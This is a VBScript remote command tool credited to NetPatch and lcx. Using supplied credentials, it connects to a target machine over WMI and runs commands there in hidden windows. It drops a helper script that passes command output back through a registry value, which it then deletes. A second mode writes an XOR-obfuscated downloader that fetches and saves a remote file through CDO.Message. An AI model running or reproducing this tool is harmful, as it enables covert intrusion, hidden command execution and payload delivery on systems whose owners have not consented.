On Error Resume Next
Set outstreem=Wscript.stdout
If (LCase(Right(Wscript.fullname,11))="Wscript.exe") Then
	Wscript.Quit
End If
If Wscript.arguments.Count<4 Then
Wscript.echo "Not enough Parameters."
   usage()
   Wscript.Quit
End If

ip=Wscript.arguments(0)
username=Wscript.arguments(1)
password=Wscript.arguments(2)
CmdStr=Wscript.arguments(3)
EchoStr=Wscript.arguments(4)
'downstr=Wscript.arguments(5)
foldername="c:\\windows\\temp\\"
wsh.echo "Conneting "&ip&" ...."
Set objlocator=CreateObject("wbemscripting.swbemlocator")
Set objswbemservices=objlocator.connectserver(ip,"root/cimv2",username,password)
showerror(err.number)
Set Win_Process=objswbemservices.Get("Win32_ProcessStartup")
Set Hide_Windows=Win_Process.SpawnInstance_
Hide_Windows.ShowWindow=12
Set Rcmd=objswbemservices.Get("Win32_Process")
Set colFiles = objswbemservices.ExecQuery _ 
("Select * from CIM_Datafile Where Name = 'c:\\windows\\temp\\read.vbs'")
If colFiles.Count = 0 Then
wsh.echo "Not found read.vbs! Create Now!"
Create_read()

End If

If EchoStr = "0" Then
	msg=Rcmd.create("cmd /c "&CmdStr,Null,Hide_Windows,intProcessID)
End if
If EchoStr = "1" Then
	msg=Rcmd.create("cmd /c cscript %windir%\temp\read.vbs """&CmdStr&"""",Null,Hide_Windows,intProcessID)
End If
If EchoStr = "3" Then
	Create_down()
End If
If msg = 0 Then
	wsh.echo "Command success..."
Else
	showerror(Err.Number)
End If
wsh.echo "Please Wait 3 Second ...."
wsh.sleep(3000)
Set StdOut = Wscript.StdOut 
Set oReg=objlocator.connectserver(ip,"root/default",username,password).Get("stdregprov")
oReg.GetMultiStringValue &H80000002,"SOFTWARE\Clients","cmd" ,arrValues 
wsh.echo String(79,"*")
wsh.echo cmdstr&Chr(13)&Chr(10)
For Each strValue In arrValues     
	StdOut.WriteLine strValue
Next 
oReg.DeleteValue &H80000002,"SOFTWARE\Clients","cmd"
Sub Create_read()
	RunYN =Rcmd.create("cmd /c echo set ws=WScript.CreateObject(^""WScript.Shell^"")> %windir%\temp\read.vbs"_
	&"&&echo str=ws.Exec(^""cmd /c ^""^&wscript.arguments(0)).StdOut.ReadAll:set ws=nothing>> %windir%\temp\read.vbs"_
	&"&&echo Set oReg=GetObject(^""winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv^"")>> %windir%\temp\read.vbs"_
	&"&&echo oReg.SetMultiStringValue ^&H80000002,^""SOFTWARE\Clients^"",^""cmd^"",Array(str) >> %windir%\temp\read.vbs",Null,Hide_Windows,intProcessID)
	If RunYN = 0 Then
		wsh.echo "read.vbs Created!!!"
	Else
		showerror(Err.Number)
	End If
End Sub
sub Create_down()
	Rundw=Rcmd.create("cmd /c echo Function Decode(s,n):ns=Split(Mid(s,2,Len(s)-1)):For i=0 To UBound(ns):on error resume next:Decode=Decode^&Chr(CInt(ns(i)) Xor n):Next:End Function>%windir%\temp\down.vbs"_
	&"&&echo Execute(Decode(^"" 26 9 18 31 8 21 19 18 92 15 29 10 25 58 21 16 25 84 26 21 16 25 18 29 17 25 80 15 8 14 85 113 118 113 118 92 92 92 92 92 15 25 8 92 29 24 19 24 30 47 8 14 25 29 17 92 65 92 63 14 25 29 8 25 51 30 22 25 31 8 84 94 61 56 51 56 62 94 92 90 92 94 82 94 92 90 92 94 47 8 14 25 29 17 94 85 113 118 113 118 92 92 92 92 92 29 24 19 24 30 47 8 14 25 29 17 82 40 5 12 25 65 92 77 113 118 92 92 92 92 92 29 24 19 24 30 47 8 14 25 29 17 82 51 12 25 18 113 118 92 92 92 92 92 29 24 19 24 30 47 8 14 25 29 17 82 11 14 21 8 25 92 15 8 14 113 118 92 92 92 92 92 29 24 19 24 30 47 8 14 25 29 17 82 47 29 10 25 40 19 58 21 16 25 92 26 21 16 25 18 29 17 25 80 78 113 118 92 92 92 92 92 29 24 19 24 30 47 8 14 25 29 17 82 63 16 19 15 25 113 118 113 118 25 18 24 92 26 9 18 31 8 21 19 18 113 118 113 118 91 83 83 42 62 -13695 -10347 -10282 -20072 -19531 -18814 -17020 -10566 -18291 -13631 113 118 58 9 18 31 8 21 19 18 92 49 9 16 8 21 62 5 8 25 40 19 62 21 18 29 14 5 84 49 9 16 8 21 62 5 8 25 85 113 118 113 118 92 92 92 92 92 56 21 17 92 46 47 80 92 48 49 9 16 8 21 62 5 8 25 80 92 62 21 18 29 14 5 113 118 92 92 92 92 92 63 19 18 15 8 92 29 24 48 19 18 27 42 29 14 62 21 18 29 14 5 92 65 92 78 76 73 113 118 92 92 92 92 92 47 25 8 92 46 47 92 65 92 63 14 25 29 8 25 51 30 22 25 31 8 84 94 61 56 51 56 62 82 46 25 31 19 14 24 15 25 8 94 85 113 118 92 92 92 92 92 48 49 9 16 8 21 62 5 8 25 92 65 92 48 25 18 62 84 49 9 16 8 21 62 5 8 25 85 113 118 92 92 92 92 92 53 26 92 48 49 9 16 8 21 62 5 8 25 66 76 92 40 20 25 18 113 118 92 92 92 92 92 92 92 92 92 92 92 92 92 46 47 82 58 21 25 16 24 15 82 61 12 12 25 18 24 92 94 17 62 21 18 29 14 5 94 80 92 29 24 48 19 18 27 42 29 14 62 21 18 29 14 5 80 92 48 49 9 16 8 21 62 5 8 25 113 118 92 92 92 92 92 92 92 92 92 92 92 92 92 46 47 82 51 12 25 18 113 118 92 92 92 92 92 92 92 92 92 92 92 92 92 46 47 82 61 24 24 50 25 11 113 118 92 92 92 92 92 92 92 92 92 92 92 92 92 46 47 84 94 17 62 21 18 29 14 5 94 85 82 61 12 12 25 18 24 63 20 9 18 23 92 49 9 16 8 21 62 5 8 25 92 90 92 63 20 14 62 84 76 85 113 118 92 92 92 92 92 92 92 92 92 92 92 92 92 46 47 82 41 12 24 29 8 25 113 118 92 92 92 92 92 92 92 92 92 92 92 92 92 62 21 18 29 14 5 92 65 92 46 47 84 94 17 62 21 18 29 14 5 94 85 82 59 25 8 63 20 9 18 23 84 48 49 9 16 8 21 62 5 8 25 85 113 118 92 92 92 92 92 57 18 24 92 53 26 113 118 92 92 92 92 92 49 9 16 8 21 62 5 8 25 40 19 62 21 18 29 14 5 92 65 92 62 21 18 29 14 5 113 118 113 118 57 18 24 92 58 9 18 31 8 21 19 18 113 118 113 118 113 118 26 9 18 31 8 21 19 18 92 25 4 25 31 84 85 113 118 92 92 92 92 92 113 118 92 92 92 92 92 91 83 83 -14659 -20046 -19311 -12657 113 118 92 92 92 92 92 19 18 92 25 14 14 19 14 92 14 25 15 9 17 25 92 50 25 4 8 113 118 92 92 92 92 92 47 25 8 92 29 14 27 15 92 65 92 43 47 31 14 21 12 8 82 61 14 27 9 17 25 18 8 15 113 118 21 26 92 29 14 27 15 82 63 19 9 18 8 92 65 92 76 92 8 20 25 18 113 118 92 92 92 92 92 43 47 31 14 21 12 8 82 57 31 20 19 92 94 41 15 29 27 25 70 92 63 47 31 14 21 12 8 92 24 19 11 18 82 10 30 15 92 9 14 16 92 31 70 32 77 82 25 4 25 94 113 118 92 92 92 92 92 43 47 31 14 21 12 8 82 45 9 21 8 92 77 113 118 92 92 92 92 92 25 18 24 92 53 26 113 118 92 92 92 92 92 92 24 21 17 92 24 29 8 29 80 8 80 23 23 80 26 21 16 25 18 29 17 25 80 15 15 113 118 92 92 92 92 92 47 25 8 92 49 29 21 16 77 92 65 92 63 14 25 29 8 25 51 30 22 25 31 8 84 94 63 56 51 82 49 25 15 15 29 27 25 94 85 113 118 92 92 92 92 92 49 29 21 16 77 82 63 14 25 29 8 25 49 52 40 49 48 62 19 24 5 92 29 14 27 15 82 53 8 25 17 84 76 85 92 80 79 77 92 113 118 91 49 29 21 16 77 82 63 14 25 29 8 25 49 52 40 49 48 62 19 24 5 92 94 31 70 32 4 4 4 32 16 31 4 82 25 4 25 81 12 26 82 20 8 17 94 80 79 77 113 118 92 92 92 92 92 15 15 65 92 49 29 21 16 77 82 52 40 49 48 62 19 24 5 113 118 92 92 92 92 92 47 25 8 92 49 29 21 16 77 65 18 19 8 20 21 18 27 92 92 113 118 113 118 92 92 92 113 118 113 118 92 92 92 92 92 91 83 83 -19009 -19007 -13695 -16735 113 118 92 92 92 92 92 24 29 8 29 92 92 92 92 92 92 92 92 92 92 92 92 92 65 92 15 15 113 118 92 92 92 92 92 91 83 83 -19009 -19007 -12616 -17278 -15481 113 118 92 92 92 92 92 26 21 16 25 18 29 17 25 92 92 92 92 92 65 92 29 14 27 15 82 53 8 25 17 84 77 85 113 118 113 118 92 92 92 92 92 91 83 83 -19009 -19007 -13695 -16735 -19496 -18764 113 118 92 92 92 92 92 92 92 92 92 9 92 65 92 16 25 18 84 24 29 8 29 85 113 118 92 92 92 92 92 113 118 92 92 92 92 92 91 83 83 -17523 -19009 -12616 -17278 -13695 -10347 113 118 92 92 92 92 92 26 19 14 92 21 65 77 92 8 19 92 9 92 15 8 25 12 92 78 113 118 92 92 92 92 92 92 92 92 92 92 92 92 92 8 92 65 92 17 21 24 84 24 29 8 29 80 21 80 78 85 113 118 92 92 92 92 92 92 92 92 92 92 92 92 92 23 23 92 65 92 23 23 92 90 92 63 20 14 62 84 31 16 18 27 84 94 90 52 94 92 90 92 8 85 85 113 118 92 92 92 92 92 18 25 4 8 113 118 113 118 92 92 92 92 92 91 83 83 -10282 -20072 -19531 -18814 -17020 -10566 -18291 -13631 113 118 92 92 92 92 92 24 29 8 29 61 14 14 5 92 65 92 49 9 16 8 21 62 5 8 25 40 19 62 21 18 29 14 5 84 23 23 85 113 118 92 92 92 92 92 113 118 92 92 92 92 92 91 83 83 -20001 -19302 -12616 -17278 92 92 92 92 92 113 118 92 92 92 92 92 15 29 10 25 58 21 16 25 92 26 21 16 25 18 29 17 25 80 24 29 8 29 61 14 14 5 113 118 113 118 92 92 92 92 113 118 92 92 92 92 25 18 24 92 26 9 18 31 8 21 19 18 113 118 113 118 25 4 25 31 84 85 113 118 92 113 118 113 118^"",124))>>%windir%\temp\down.vbs",Null,Hide_Windows,intProcessID)
	If Rundw = 0 Then
		wsh.echo "down.vbs Created!!!"
	Else
		showerror(Err.Number)
	End If
End Sub
Function showerror(errornumber)
If errornumber Then
   wsh.echo "Error 0x"&CStr(Hex(Err.Number))&" ."
   If Err.Description <> "" Then
      wsh.echo "Error Description: "&Err.Description&"."
   End If
   Wscript.Quit
Else
   outstreem.Write "."
End If
End Function

Sub usage()
wsh.echo string(79,"*")
	wsh.echo "Rcmd v1.01 by NetPatch modiy by lcx"
	wsh.echo "Usage:"
	wsh.echo "cscript "&wscript.scriptfullname&" targetIP username password ""Command"" 1 //on echo"
	wsh.echo "cscript "&wscript.scriptfullname&" targetIP username password ""Command"" 0 //off echo create "
	wsh.echo "cscript "&wscript.scriptfullname&" targetIP username password """" 3 // create cdo.message.down.vbs "
	wsh.echo string(79,"*")&vbcrlf
end Sub